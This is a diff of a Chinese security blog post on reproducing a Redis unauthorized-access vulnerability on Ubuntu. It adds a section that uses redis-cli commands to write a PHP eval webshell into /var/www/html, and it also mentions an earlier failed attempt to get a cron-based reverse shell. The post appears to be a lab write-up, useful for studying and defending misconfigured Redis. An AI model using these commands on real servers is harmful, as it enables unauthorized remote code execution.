@@ -98,7 +98,11 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/848Lkaj8EF.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/4IdFkL5gci.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/E2h2Fm7ffc.png?imageslim">
-<meta property="og:updated_time" content="2018-08-18T17:28:33.382Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/iJLjC1JD7B.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/fClIhiBE92.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/IBEEbfgDJj.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180820/eke56eebcF.png?imageslim">
+<meta property="og:updated_time" content="2018-08-19T17:03:28.593Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现">
 <meta name="twitter:description" content="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的解决ubuntu">
@@ -397,6 +401,13 @@ command: 需要执行的命令
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/848Lkaj8EF.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/4IdFkL5gci.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/E2h2Fm7ffc.png?imageslim" alt="mark"></p>
 <p><strong>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向<code>/etc/cron.d</code>目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</strong></p>
 <h3 id="对于这一次失败的总结和看法"><a href="#对于这一次失败的总结和看法" class="headerlink" title="对于这一次失败的总结和看法"></a>对于这一次失败的总结和看法</h3><p><strong>对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron的区别以及一些其它的安全机制有了更深的认识，所以，虽然失败，但是这一切都是值得的</strong></p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>既然在ubuntu下写任务计划反弹shell这种方法不可行是因为ubuntu cron的原因，那么还是可以尝试其它的一些方式去利用该redis未授权访问漏洞的，比如利用redis写webshell或者向服务器写入ssh公钥去远程登陆，下面来说一下ubuntu环境下的redis未授权访问漏洞的另外两种利用手法</strong></p>
+<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为<code>/var/www/html</code>,在kali的redis-cli的交互式shell下执行</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/iJLjC1JD7B.png?imageslim" alt="mark"><br><strong>执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,主要ubuntu默认安装的是php7，如果想让php解析，需要</strong></p>
+<pre><code>sudo apt-get install libapache2-mod-php
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/fClIhiBE92.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/IBEEbfgDJj.png?imageslim" alt="mark"></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180820/eke56eebcF.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -437,8 +448,8 @@ command: 需要执行的命令
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/19/redis/" rel="prev" title="redis未授权访问漏洞的几种利用方式">
-                redis未授权访问漏洞的几种利用方式 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/19/redis/" rel="prev" title="centos环境下的redis未授权访问漏洞的几种利用方式">
+                centos环境下的redis未授权访问漏洞的几种利用方式 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -603,7 +614,7 @@ command: 需要执行的命令
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境及搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞环境及搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试利用linux任务计划文件去反弹shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">尝试利用linux任务计划文件去反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于这一次失败的总结和看法"><span class="nav-number">1.0.3.</span> <span class="nav-text">对于这一次失败的总结和看法</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境及搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞环境及搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试利用linux任务计划文件去反弹shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">尝试利用linux任务计划文件去反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于这一次失败的总结和看法"><span class="nav-number">1.0.3.</span> <span class="nav-text">对于这一次失败的总结和看法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充"><span class="nav-number">2.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问写webshell"><span class="nav-number">2.0.1.</span> <span class="nav-text">利用redis未授权访问写webshell</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
